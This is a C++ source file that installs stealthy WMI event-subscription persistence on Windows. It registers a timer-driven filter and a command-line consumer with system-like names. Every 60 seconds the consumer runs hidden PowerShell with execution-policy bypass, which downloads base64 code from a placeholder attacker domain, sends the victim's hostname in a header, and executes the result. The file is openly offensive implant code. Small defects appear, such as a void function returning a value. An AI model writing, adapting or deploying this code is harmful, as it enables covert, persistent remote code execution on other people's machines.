#include <Windows.h>
#include <comdef.h>
#include <WbemIdl.h>
#include <comutil.h>
#include <iostream>
#include <tchar.h>

#pragma comment(lib, "wbemuuid.lib")

using namespace std;

void scheduleCallback(){
	IWbemLocator *ploc = NULL;
	IWbemServices *psvc = NULL;
	WCHAR *cmd = L"powershell -w hidden -ep bypass -nop -c \"$i=(New-Object System.Net.WebClient);$i.Headers.add('hostid',[net.dns]::GetHostByName('').HostName);IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String(($i.DownloadString('http://your.domain.here')))))\"";

        //init com interface
	HRESULT h = CoInitializeEx(0, COINIT_MULTITHREADED);
	IWbemClassObject *ef = NULL, *ec = NULL, *e2c = NULL, *ti = NULL;
	IWbemClassObject *eventConsumer = NULL, *eventFilter = NULL, *f2cBinding = NULL, *timerinstruction = NULL;

	if (FAILED(h)){
		cout << "Failed com init" << endl;
		getchar();
		return 1;
	}

        //init COM security context
	h = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
	if (FAILED(h)){
		cout << "Failed security init" << endl;
		goto rip;
	}

        //create COM instance for WBEM
	h = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&ploc);
	if (FAILED(h)){
		cout << "Failed to create wbem locator" << endl;
		goto rip;
	}

        //connect to the \\root\subscription namespace
	h = ploc->ConnectServer(_bstr_t(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, NULL, 0, 0, &psvc);
	if (FAILED(h)){
		cout << "Failed to open subscription namesapce" << endl;
		goto rip;
	}

        //set COM proxy blanket
	h = CoSetProxyBlanket(psvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
	if (FAILED(h)){
		cout << "Failed to set proxy blanket" << endl;
		goto rip;
	}

        //get class instances
	h = psvc->GetObject(L"CommandLineEventConsumer", 0, NULL, &eventConsumer, NULL);
	if (FAILED(h)){
		cout << "Failed to get event consumer class object" << endl;
		goto rip;
	}

	h = psvc->GetObject(L"__EventFilter", 0, NULL, &eventFilter, NULL);
	if (FAILED(h)){
		cout << "Failed to get event filter class object" << endl;
		goto rip;
	}

	h = psvc->GetObject(L"__FilterToConsumerBinding", 0, NULL, &f2cBinding, NULL);
	if (FAILED(h)){
		cout << "Failed to get filter to consumer class object" << endl;
		goto rip;
	}

	h = psvc->GetObject(L"__IntervalTimerInstruction", 0, NULL, &timerinstruction, NULL);
	if (FAILED(h)){
		cout << "Failed to get timer instruction class object" << endl;
		goto rip;
	}

        //spawn __EventFilter class instance
	h = eventFilter->SpawnInstance(0, &ef);
	if (FAILED(h)){
		cout << "event filter instance spawn failed" << endl;
	}
	else {
		putStringInClass(ef, L"Query", L"SELECT * FROM __timerevent where TimerId=\"__SysTimer1\"", CIM_STRING);
		putStringInClass(ef, L"QueryLanguage", L"WQL", CIM_STRING);
		putStringInClass(ef, L"Name", L"Filter1", CIM_STRING);
		h = psvc->PutInstance(ef, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
		if (FAILED(h)){
			cout << "Failed to put event filter instance" << endl;
		}
	}

        //spawn CommandLineEventConsumer class instance
	h = eventConsumer->SpawnInstance(0, &ec);
	if (FAILED(h)){
		cerr << "failed to spawn command line consumer" << endl;
	}
	else {
		putStringInClass(ec, L"Name", L"__SysConsumer1", CIM_STRING);
		putStringInClass(ec, L"CommandLineTemplate", bstr_t(cmd), CIM_STRING);

		h = psvc->PutInstance(ec, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
		if (FAILED(h)){
			cout << "CommandLineConsumer put instance failed" << endl;
		}
	}

        //spawn __FilterToConsumerBinding class instance
	h = f2cBinding->SpawnInstance(0, &e2c);
	if (FAILED(h)){
		cout << "filter to consumer instance spawn failed" << endl;
	}
	else {

		putStringInClass(e2c, L"Consumer", L"CommandLineEventConsumer.Name=\"__SysConsumer1\"", CIM_REFERENCE);
		putStringInClass(e2c, L"Filter", L"__EventFilter.Name=\"Filter1\"", CIM_REFERENCE);

		h = psvc->PutInstance(e2c, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
		if (FAILED(h)){
			cout << "filter to consumer put instance failed" << endl;
		}
	}

        //spawn __IntervalTimerInstruction class instance
	h = timerinstruction->SpawnInstance(0, &ti);
	if (FAILED(h)){
		cout << "timer instruction instance spawn failed" << endl;
	}
	else {
		putStringInClass(ti, L"TimerId", L"__SysTimer1", CIM_STRING);
		putStringInClass(ti, L"IntervalBetweenEvents", L"60000", CIM_UINT32);

		h = psvc->PutInstance(ti, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
		if (FAILED(h)){
			cout << "timer instruction put instance failed" << endl;
		}
	}

	if (ti)
		ti->Release();
	if (e2c)
		e2c->Release();
	if (ef)
		ef->Release();
	if (ec)
		ec->Release();
	ti = ec = ef = e2c = NULL;
rip:
	if (eventConsumer)
		eventConsumer->Release();
	if (eventFilter)
		eventFilter->Release();
	if (f2cBinding)
		f2cBinding->Release();
	if (timerinstruction)
		timerinstruction->Release();
	if (psvc)
		psvc->Release();
	if (ploc)
		ploc->Release();
}
